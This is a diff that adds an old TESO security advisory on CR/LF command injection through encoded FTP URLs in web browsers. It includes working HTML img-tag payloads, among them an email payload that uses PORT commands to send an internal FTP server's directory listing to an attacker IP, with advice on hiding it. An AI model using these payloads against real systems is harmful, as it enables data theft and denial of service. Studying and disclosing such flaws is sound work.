@@ -1,0 +1,74 @@
+0018 2000/03/11  Exploiting FTP URL parsing within web browsers
+
+==== TESO Informational =======================================================
+This piece of information is to be kept confidential.
+===============================================================================
+
+Description ..........: Exploiting FTP URL parsing within web browsers
+Date .................: 2000/03/11 19:00
+Author ...............: scut
+Publicity level ......: known
+Affected .............: Web browsers which parse FTP URLs in HTML tags
+Type of entity .......: implementation
+Type of discovery ....: useful information
+Severity/Importance ..: low
+Found by .............: bugtraq readers
+
+Information ===================================================================
+
+Common web browsers such as Netscape Navigator and Microsoft Internet Explorer
+have the ability to download files using the FTP file transfer protocol. It is
+also possible to use an FTP URL as source address for binary files such as
+images or other objects included within a HTML file.
+
+However, the URL encoding scheme allows one to use encoded characters within
+the URL, such as "%20" which means the character '\x20', which is a space. All
+characters are allowed, no filtering takes place.
+
+Therefore it's possible to use the FTP protocol command separator character
+sequence which happens to be (CR, LF) too. This way arbitrary commands can be
+executed on the FTP server the URL uses.
+
+Example:
+
+<img src="ftp://ftp.cdrom.com/foobar.gif%0d%0aHELP">
+
+This URL within the "src" parameter is translated by the browser (Netscape
+Navigator in this case) to:
+
+USER anonymous
+PASS mozilla@
+REST 0
+SYST
+PASV
+TYPE I
+SIZE /foobar.gif
+HELP
+
+The SIZE command uses the user supplied filename, which happens to be
+"/foobar.gif\x0d\x0aHELP" and appends a CR,LF sequence to it, resulting in an
+extra FTP command "HELP" being executed.
+
+We can exploit this in several ways. One way would be to launch a denial of
+service attack using this technique. To do this one would inject a few of this
+modified FTP URLs into a high traffic web site which has lots of visitors. The
+URLs would contain PORT commands to create a connection to another site and
+then transfer a big file from the server to it.
+
+In a similar way we can exploit IP based trust relationships. Given the
+situation that user "joe" from company A uses an anonymous company internal ftp
+server "private" to access his files. We know his email client is able to read
+HTML emails, then we could inject a link such as:
+
+<img lowsrc="http://blabla.com/transparent.gif"
+     src="ftp://private/foobar.gif%0d%0aPORT%20123,124,125,126,10,0%0d%0aNLST">
+
+Where 123.124.125.126 is our IP with a listening TCP socket on port 2560
+(10 * 256 + 0). We would receive a listing of the files in the "/" directory
+once "joe" reads this mail. Since the "/foobar.gif" doesn't exist on "private"
+his email client would use the "lowsrc" parameter, which can be a 1x1 pixel
+dummy image to avoid detection. Also the whole URL can be encoded for
+further obfuscation.
+
+===============================================================================
+
